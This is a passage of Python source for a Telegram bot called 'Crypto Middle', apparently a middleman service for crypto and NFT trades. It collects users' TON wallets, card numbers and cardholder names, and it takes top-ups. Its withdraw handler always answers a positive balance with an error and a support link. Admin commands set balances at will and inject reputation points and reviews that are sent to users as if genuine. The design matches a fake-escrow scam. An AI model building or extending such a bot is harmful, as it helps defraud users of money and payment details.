async def save_ton(message: Message, state: FSMContext):
    uid = message.from_user.id
    reg(message)
    await safe_del(message)
    addr = message.text.strip()
    if not valid_ton(addr):
        await message.answer(L(uid,"req_ton_invalid"), parse_mode="HTML",
                             reply_markup=cancel_kb(uid))
        return
    get_user(uid).update({"ton_wallet": addr, "has_requisites": True})
    data   = await state.get_data()
    suffix = L(uid,"redo_deal") if data.get("from_deal") else ""
    await state.clear()
    await message.answer(L(uid,"req_ton_saved") + suffix, parse_mode="HTML",
                         reply_markup=main_kb(uid))

@dp.message(AddReq.card_num)
async def save_card_num(message: Message, state: FSMContext):
    uid = message.from_user.id
    reg(message)
    await safe_del(message)
    num = message.text.strip()
    if not valid_card(num):
        await message.answer(L(uid,"req_card_invalid"), parse_mode="HTML",
                             reply_markup=cancel_kb(uid))
        return
    await state.update_data(card_number=num)
    await message.answer(L(uid,"req_card_num_saved"), parse_mode="HTML",
                         reply_markup=cancel_kb(uid))
    await state.set_state(AddReq.card_name)

@dp.message(AddReq.card_name)
async def save_card_name(message: Message, state: FSMContext):
    uid = message.from_user.id
    reg(message)
    await safe_del(message)
    name = message.text.strip()
    data = await state.get_data()
    get_user(uid).update({
        "card_number": data.get("card_number",""),
        "card_name":   name,
        "has_requisites": True
    })
    suffix = L(uid,"redo_deal") if data.get("from_deal") else ""
    await state.clear()
    await message.answer(L(uid,"req_card_saved") + suffix, parse_mode="HTML",
                         reply_markup=main_kb(uid))

# ── top-up: выбор метода -> ввод суммы -> реквизиты ─────────────────────────

@dp.callback_query(F.data == "topup")
async def cb_topup(callback: CallbackQuery):
    uid = callback.from_user.id
    await safe_del(callback.message)
    await callback.message.answer(L(uid,"topup_title"), parse_mode="HTML",
                                  reply_markup=topup_kb(uid))
    await callback.answer()

@dp.callback_query(F.data == "topup_stars")
async def cb_topup_stars(callback: CallbackQuery, state: FSMContext):
    uid = callback.from_user.id
    await safe_del(callback.message)
    await callback.message.answer(L(uid,"topup_enter_amount"), parse_mode="HTML",
                                  reply_markup=cancel_kb(uid))
    await state.set_state(TopUp.amount)
    await state.update_data(topup_method="stars")
    await callback.answer()

@dp.callback_query(F.data == "topup_ton")
async def cb_topup_ton(callback: CallbackQuery, state: FSMContext):
    uid = callback.from_user.id
    await safe_del(callback.message)
    await callback.message.answer(L(uid,"topup_enter_amount"), parse_mode="HTML",
                                  reply_markup=cancel_kb(uid))
    await state.set_state(TopUp.amount)
    await state.update_data(topup_method="ton")
    await callback.answer()

@dp.callback_query(F.data == "topup_card")
async def cb_topup_card(callback: CallbackQuery, state: FSMContext):
    uid = callback.from_user.id
    await safe_del(callback.message)
    await callback.message.answer(L(uid,"topup_enter_amount"), parse_mode="HTML",
                                  reply_markup=cancel_kb(uid))
    await state.set_state(TopUp.amount)
    await state.update_data(topup_method="card")
    await callback.answer()

@dp.callback_query(F.data == "topup_nft")
async def cb_topup_nft(callback: CallbackQuery, state: FSMContext):
    uid = callback.from_user.id
    await safe_del(callback.message)
    # NFT без суммы — сразу реквизиты
    await callback.message.answer(L(uid,"topup_nft"), parse_mode="HTML",
                                  reply_markup=topup_paid_kb(uid))
    await callback.answer()

@dp.message(TopUp.amount)
async def topup_amount(message: Message, state: FSMContext):
    uid = message.from_user.id
    reg(message)
    await safe_del(message)
    raw = message.text.strip().replace(",",".")
    try:
        amount = float(raw)
        if amount <= 0: raise ValueError
    except ValueError:
        await message.answer(L(uid,"topup_amount_invalid"), parse_mode="HTML",
                             reply_markup=cancel_kb(uid))
        return
    data   = await state.get_data()
    method = data.get("topup_method","ton")
    await state.clear()

    amt_str = str(int(amount)) if amount == int(amount) else str(amount)
    await message.answer(
        L(uid, f"topup_{method}", amount=amt_str),
        parse_mode="HTML",
        reply_markup=topup_paid_kb(uid)
    )

# ── withdraw ─────────────────────────────────────────────────────────────────

@dp.callback_query(F.data == "withdraw")
async def cb_withdraw(callback: CallbackQuery):
    uid     = callback.from_user.id
    balance = get_user(uid).get("balance", 0.0)
    await safe_del(callback.message)
    if balance <= 0:
        await callback.message.answer(
            L(uid,"withdraw_no_funds"), parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text=L(uid,"btn_topup"),  callback_data="topup")],
                [InlineKeyboardButton(text=L(uid,"btn_back"),   callback_data="menu")],
            ])
        )
    else:
        await callback.message.answer(
            L(uid,"withdraw_error"), parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text=L(uid,"btn_support"),
                                      url=f"https://t.me/{SUPPORT_USERNAME.lstrip('@')}")],
                [InlineKeyboardButton(text=L(uid,"btn_back"), callback_data="menu")],
            ])
        )
    await callback.answer()

# ── admin ────────────────────────────────────────────────────────────────────

@dp.message(Command("adm"))
async def cmd_adm(message: Message):
    if message.from_user.id not in ADMIN_IDS: return
    total = len([k for k in user_data if not str(k).startswith("_")])
    await message.answer(
        f"<b>Админ-панель | Crypto Middle</b>\n\n"
        f"Пользователей: <b>{total}</b>\n"
        f"Сделок: <b>{len(deals)}</b>",
        parse_mode="HTML", reply_markup=admin_kb())

@dp.callback_query(F.data == "adm_banner")
async def adm_banner(callback: CallbackQuery, state: FSMContext):
    if callback.from_user.id not in ADMIN_IDS: return
    await safe_del(callback.message)
    await callback.message.answer(
        "Отправьте <b>фото + подпись</b> для баннера.",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Отмена", callback_data="adm_cancel")]
        ]))
    await state.set_state(SetBanner.waiting)
    await callback.answer()

@dp.message(SetBanner.waiting, F.photo)
async def save_banner(message: Message, state: FSMContext):
    if message.from_user.id not in ADMIN_IDS: return
    user_data["_banner"] = {"photo_id": message.photo[-1].file_id,
                            "caption":  message.caption or ""}
    await safe_del(message)
    await message.answer("Баннер обновлен!", reply_markup=admin_kb())
    await state.clear()

@dp.callback_query(F.data == "adm_stats")
async def adm_stats(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS: return
    total    = len([k for k in user_data if not str(k).startswith("_")])
    with_req = len([v for k,v in user_data.items()
                    if not str(k).startswith("_") and isinstance(v,dict) and v.get("has_requisites")])
    active   = len([d for d in deals.values() if d.get("status")=="active"])
    await callback.message.answer(
        f"<b>Статистика</b>\n\n"
        f"Всего: <b>{total}</b>\n"
        f"С реквизитами: <b>{with_req}</b>\n"
        f"Сделок: <b>{len(deals)}</b>\n"
        f"Активных: <b>{active}</b>",
        parse_mode="HTML")
    await callback.answer()

@dp.callback_query(F.data == "adm_users")
async def adm_users(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS: return
    ulist = [k for k in user_data if not str(k).startswith("_")]
    text  = f"<b>Пользователи ({len(ulist)})</b>\n\n"
    for uid in ulist[:20]:
        u = user_data[uid]
        if not isinstance(u,dict): continue
        text += (f"<code>{uid}</code> rep:{u.get('reputation',0)} "
                 f"deals:{u.get('deals_count',0)} "
                 f"{'req' if u.get('has_requisites') else 'no-req'} "
                 f"{u.get('lang','ru')}\n")
    if len(ulist) > 20:
        text += f"\n...еще {len(ulist)-20}"
    await callback.message.answer(text, parse_mode="HTML")
    await callback.answer()

@dp.callback_query(F.data == "adm_reputation")
async def adm_rep(callback: CallbackQuery, state: FSMContext):
    if callback.from_user.id not in ADMIN_IDS: return
    await callback.message.answer(
        "<b>Репутация</b>\n\nФормат: <code>@username +5</code>",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Отмена", callback_data="adm_cancel")]
        ]))
    await state.set_state(AdminAction.reputation)
    await callback.answer()

@dp.message(AdminAction.reputation)
async def process_rep(message: Message, state: FSMContext):
    if message.from_user.id not in ADMIN_IDS: return
    try:
        parts = message.text.strip().split()
        uid   = find_uid(parts[0])
        if uid is None:
            await message.answer("Пользователь не найден.")
            await state.clear(); return
        delta = int(parts[1])
        user  = get_user(uid)
        user["reputation"] = user.get("reputation",0) + delta
        await message.answer(
            f"Репутация <code>{uid}</code>: {delta:+}\nИтого: <b>{user['reputation']}</b>",
            parse_mode="HTML")
        await bot.send_message(uid,
            f"Ваша репутация изменена: <b>{delta:+}</b>\nТекущая: <b>{user['reputation']}</b>",
            parse_mode="HTML")
    except Exception:
        await message.answer("Ошибка. Формат: <code>@username +5</code>", parse_mode="HTML")
    await state.clear()

@dp.callback_query(F.data == "adm_review")
async def adm_review(callback: CallbackQuery, state: FSMContext):
    if callback.from_user.id not in ADMIN_IDS: return
    await callback.message.answer(
        "<b>Отзыв</b>\n\nФормат: <code>@username Текст</code>",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Отмена", callback_data="adm_cancel")]
        ]))
    await state.set_state(AdminAction.review)
    await callback.answer()

@dp.message(AdminAction.review)
async def process_review(message: Message, state: FSMContext):
    if message.from_user.id not in ADMIN_IDS: return
    try:
        parts = message.text.strip().split(maxsplit=1)
        uid   = find_uid(parts[0])
        if uid is None:
            await message.answer("Пользователь не найден.")
            await state.clear(); return
        get_user(uid).setdefault("reviews",[]).append(parts[1])
        await message.answer(f"Отзыв добавлен <code>{uid}</code>", parse_mode="HTML")
        await bot.send_message(uid, f"<b>Новый отзыв:</b>\n\n{parts[1]}", parse_mode="HTML")
    except Exception:
        await message.answer("Ошибка.")
    await state.clear()

@dp.callback_query(F.data == "adm_balance")
async def adm_bal(callback: CallbackQuery, state: FSMContext):
    if callback.from_user.id not in ADMIN_IDS: return
    await callback.message.answer(
        "<b>Баланс</b>\n\nФормат: <code>@username 150.5</code>",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Отмена", callback_data="adm_cancel")]
        ]))
    await state.set_state(AdminAction.balance)
    await callback.answer()

@dp.message(AdminAction.balance)
async def process_bal(message: Message, state: FSMContext):
    if message.from_user.id not in ADMIN_IDS: return
    try:
        parts  = message.text.strip().split()
        uid    = find_uid(parts[0])
        if uid is None:
            await message.answer("Пользователь не найден.")
            await state.clear(); return
        amount = float(parts[1])
        user   = get_user(uid)
        old    = user.get("balance",0)
        user["balance"] = amount
        await message.answer(
            f"Баланс <code>{uid}</code>: {old} -> <b>{amount}</b>", parse_mode="HTML")
        await bot.send_message(uid,
            f"Ваш баланс обновлен: <b>{amount}</b>", parse_mode="HTML")
    except Exception:
        await message.answer("Ошибка.")
    await state.clear()

@dp.callback_query(F.data == "adm_deals")
async def adm_deals_cb(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS: return
    if not deals:
        await callback.message.answer("Сделок пока нет.")
        await callback.answer(); return
    text = f"<b>Сделки ({len(deals)})</b>\n\n"
    for deal_id, d in list(deals.items())[-10:]:
        text += (f"<code>{deal_id}</code> | {d['uid']} | {d.get('partner','-')}\n"
                 f"{d['amount']} {d['currency']} | {d['description'][:25]}\n"
                 f"Статус: {d['status']}\n\n")
    await callback.message.answer(text, parse_mode="HTML")
    await callback.answer()

@dp.callback_query(F.data == "adm_cancel")
async def adm_cancel(callback: CallbackQuery, state: FSMContext):
    await state.clear()
    await callback.message.answer("Отменено.", reply_markup=admin_kb())
    await callback.answer()

# ── run ──────────────────────────────────────────────────────────────────────

async def set_commands():
    await bot.set_my_commands([
        BotCommand(command="start", description="Главное меню / Main menu"),
        BotCommand(command="adm",   description="Админ-панель"),
    ])

async def main():
    await set_commands()
    print("Crypto Middle Bot запущен!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
